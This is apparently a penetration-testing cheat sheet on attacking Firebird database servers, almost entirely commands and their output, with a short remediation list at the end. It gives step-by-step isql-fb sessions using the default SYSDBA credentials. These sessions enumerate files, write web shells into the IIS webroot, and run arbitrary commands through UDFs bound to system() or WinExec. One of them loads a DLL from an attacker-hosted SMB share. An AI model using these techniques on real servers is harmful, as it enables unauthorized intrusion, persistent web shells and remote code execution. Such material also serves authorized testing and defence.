## Firebird Database Exploitation

#### Login attack on Firebird database
```
https://github.com/InfosecMatter/Scripts/blob/master/firebird-bruteforce.sh
```

#### Firebird exploits

```
searchsploit firebird
```
#### File enumeration
c:\psplog.txt exists or not: 

```
root@kali:~# isql-fb
SQL> create database '10.1.10.101/3050:C:\psplog.txt' user 'SYSDBA' password 'masterkey';

Statement failed, SQLSTATE = 08001
I/O error during "CreateFile (create)" operation for file "C:\PSPLOG.TXT"
-Error while trying to create file
-The file exists
```
```
root@kali:~# isql-fb
SQL> create database '10.1.10.101/3050:C:\psplog.txt' user 'SYSDBA' password 'masterkey';
SQL> drop database;
```
 c:\psplog.txt didn’t exist, so we created it and removed it right away.
 
#### Directory enumeration

```
root@kali:~# isql-fb
SQL> create database '10.1.10.101/3050:C:\inetpub' user 'SYSDBA' password 'masterkey';

Statement failed, SQLSTATE = 08001
I/O error during "CreateFile (create)" operation for file "C:\INETPUB"
-Error while trying to create file
-Access is denied.
```
same as file enumeration

### Arbitrary file creation 

#### Method 1: Database creation
```
root@kali:~# isql-fb
SQL> CREATE DATABASE '10.1.10.101/3050:C:\inetpub\wwwroot\mytest.asp' user 'SYSDBA' password 'masterkey';
SQL> CREATE TABLE a ( x BLOB);
SQL> INSERT INTO a VALUES ('<ASP/JSP/PHP shell>');
SQL> COMMIT;
SQL> EXIT;
```
it generate lot of garbage in the beginning of the file. 
#### Method 2: External table
##### Using BLOB data type
```
root@kali:~# isql-fb
SQL> CREATE DATABASE '10.1.10.101/3050:C:\non-existent-file' user 'SYSDBA' password 'masterkey';
SQL> CREATE TABLE a EXTERNAL 'C:\inetpub\wwwroot\mytest.asp' ( x blob);

Statement failed, SQLSTATE = HY004
unsuccessful metadata update
-CREATE TABLE A failed
-SQL error code = -607
-Invalid command
-Data type BLOB is not supported for EXTERNAL TABLES. Relation 'A', field 'X'
```
But we can’t – BLOB is not supported for external tables in our case. Let’s try workaround..
##### Using CHAR data type
```
root@kali:~# isql-fb
SQL> CREATE DATABASE '10.1.10.101/3050:C:\non-existent-file' user 'SYSDBA' password 'masterkey';
SQL> CREATE TABLE a EXTERNAL 'C:\inetpub\wwwroot\mytest.asp' ( x char(2000));
```
Seems like it is working this time, there is no error. Let’s try to sneak into it some ASP code:
```
SQL> INSERT INTO a values ('<%= date() %>');

Statement failed, SQLSTATE = 28000
Use of external file at location C:\inetpub\wwwroot\mytest.asp is not allowed by server configuration
```
Ha, seems like we can’t use external tables in our case after all. But it’s worth to try, it could potentially work.In the end, make sure to clean up:
```
root@kali:~# isql-fb
SQL> CONNECT '10.1.10.101/3050:C:\non-existent-file' user 'SYSDBA' password 'masterkey';
SQL> DROP DATABASE;
```
#### Method 3: Create difference file
```
root@kali:~# isql-fb
SQL> CREATE DATABASE '10.1.10.101/3050:C:\non-existent-file' user 'SYSDBA' password 'masterkey';
SQL> CREATE TABLE a( x blob);
SQL> ALTER DATABASE ADD DIFFERENCE FILE 'C:\inetpub\wwwroot\mytest.asp';
SQL> ALTER DATABASE BEGIN BACKUP;
SQL> INSERT INTO a VALUES ('<ASP/JSP/PHP shell>');
SQL> COMMIT;
SQL> EXIT;
```
```
Access web shell : http://10.10.10.10/mytest.asp?cmd=ls
```
To clean up the webshell from the remote system afterward, execute:

```
root@kali:~# isql-fb
SQL> CONNECT '10.1.10.101/3050:C:\non-existent-file' user 'SYSDBA' password 'masterkey';
SQL> ALTER DATABASE END BACKUP;
SQL> ALTER DATABASE DROP DIFFERENCE FILE;
SQL> DROP DATABASE;
```
This will delete both C:\non-existent-file and C:\inetpub\wwwroot\mytest.asp files from the remote system.

### Remote code execution using UDF

By using the /lib/libc.so library and its system() function, it was possible to execute arbitrary code like this:
```
SQL> DECLARE EXTERNAL FUNCTION exec cstring(4096) RETURNS cstring(4096) ENTRY_POINT 'system' MODULE_NAME '/lib/libc.so';

SQL> SELECT FIRST 1 exec('<COMMAND>') FROM any_table LIMIT 1;
```

```
SQL> DECLARE EXTERNAL FUNCTION exec cstring(4096) RETURNS integer BY VALUE ENTRY_POINT 'system' MODULE_NAME 'fbudf';

SQL> SELECT FIRST 1 exec('<COMMAND>') FROM any_table LIMIT 1;
```
### Use different libraries

```
SQL> DECLARE EXTERNAL FUNCTION EXEC cstring(4096), integer RETURNS integer BY VALUE ENTRY_POINT 'System' MODULE_NAME 'c:\windows\system32\msvcrt.dll';

SQL> SELECT FIRST 1 EXEC('<COMMAND>') FROM any_table LIMIT 1;
```

### Load the library remotely
We can also try hosting the library on our Kali box using the SMB/CIFS network share. Note that there should not be any authentication required – it should be a plain no auth / guest access. We can easily use Impacket for that like this:
```
/opt/impacket/examples/smbserver.py public /tmp/files
```
Now copy the kernel32.dll file into the /tmp/files directory and then declare the EXEC function using UNC path like this:
```
SQL> DECLARE EXTERNAL FUNCTION EXEC cstring(4096), integer RETURNS integer BY VALUE ENTRY_POINT 'WinExec' MODULE_NAME '\10.19.1.205\public\kernel32.dll';

SQL> SELECT FIRST 1 EXEC('<COMMAND>', 1) FROM any_table LIMIT 1;
```
### Remediation strategy

```
    Change the credentials for the SYSDBA account as soon as possible.
    Do not expose the Firebird database on the network interface. Run it on the localhost interface, if possible.
    Make sure that the Firebird database does not run with nt authority\system privileges (in case of Windows) or root privileges (in case of *nix). Use only a limited user account with limited privileges.
```






